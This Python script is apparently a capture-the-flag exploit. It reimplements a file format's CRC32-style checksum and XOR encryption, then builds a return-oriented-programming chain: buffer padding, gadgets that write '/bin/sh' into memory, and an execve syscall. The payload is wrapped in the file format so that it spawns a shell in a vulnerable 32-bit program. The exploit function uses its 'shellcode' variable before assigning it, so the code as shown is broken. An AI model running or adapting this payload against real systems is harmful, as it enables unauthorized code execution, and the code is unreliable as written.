import struct
import sys

def get_checksum(data):
	length = len(data)

	v5 = 0
	v3 = -1
	while(v5 < length):
		v3 ^= ord(data[v5])
		v3 &= 0xffffffff

		for i in range(0, 8):
			v3 = (v3 >> 1) ^-(v3 & 1) & 0xEDB88320
			v3 &= 0xffffffff
		
		v5 += 1

	return (~v3) & 0xffffffff

def xcrypt(data, password):
	v4 = len(password)

	res = ""
	for i in range(0, len(data)):
		res += chr(ord(data[i]) ^ (ord(password[i % v4]) ^ (i & 0xff)))

	return res

def decrypt(data, password):
	cryptedChecksum = struct.unpack('I', data[0:4])[0]
	data = data[4:]

	if get_checksum(data) != cryptedChecksum:
		print("Error: Invalid or corrupted file")
		return None

	data = xcrypt(data, password)

	checksum = struct.unpack('I', data[0:4])[0]

	if get_checksum(data[4:]) != checksum:
		print("Error: File data corrupted, bad password maybe?")
		return None

	length = struct.unpack('h', data[4:6])[0]
	msg = data[6:]	
	return msg

def encrypt(data, password):
	length = struct.pack("h", len(data))

	data = length + data

	checksum = get_checksum(data)
	checksum = struct.pack("I", checksum)
	data = checksum + data

	data = xcrypt(data, password)

	checksum = get_checksum(data)
	checksum = struct.pack("I", checksum)

	return checksum + data

def exploit():
	shellcode += "A"*4124

	shellcode += struct.pack("<I", 0x08058386) # pop edx; ret
	shellcode += "/bin"
	shellcode += struct.pack("<I", 0x080a8326) # pop eax; ret
	shellcode += struct.pack("<I", 0x080cb000) # address where saving /bin
	shellcode += struct.pack("<I", 0x08062968) # mov [eax], edx; pop ebx; pop ebp; ret
	shellcode += "BBBB"*2

	shellcode += struct.pack("<I", 0x08058386) # pop edx; ret
	shellcode += "/sh\x00"
	shellcode += struct.pack("<I", 0x080a8326) # pop eax; ret
	shellcode += struct.pack("<I", 0x080cb004) # address where saving /sh\x00
	shellcode += struct.pack("<I", 0x08062968) # mov [eax], edx; pop ebx; pop ebp; ret
	shellcode += "CCCC"*2

	shellcode += struct.pack("<I", 0x080a8326) # pop eax; ret
	shellcode += struct.pack("<I", 0x0b)	   # sys_execve

	shellcode += struct.pack("<I", 0x080583ad) # pop ecx; pop ebx; ret
	shellcode += struct.pack("<I", 0x0)		   # argv
	shellcode += struct.pack("<I", 0x080cb000) # filename

	shellcode += struct.pack("<I", 0x08058386) # pop edx; ret
	shellcode += struct.pack("<I", 0x0)		   # envp

	shellcode += struct.pack("<I", 0x08058ab0) # int 80h

	return shellcode

if __name__ == "__main__":
	method = sys.argv[1]
	filename = sys.argv[2]
	password = sys.argv[3]

	try:
		data = open(filename).read()
	except:
		data = ""

	if method == "de":
		sys.stdout.write(decrypt(data, password))
	elif method == "en":
		sys.stdout.write(encrypt(data, password))
	elif method == "exploit":
		sys.stdout.write(encrypt(exploit(), password))
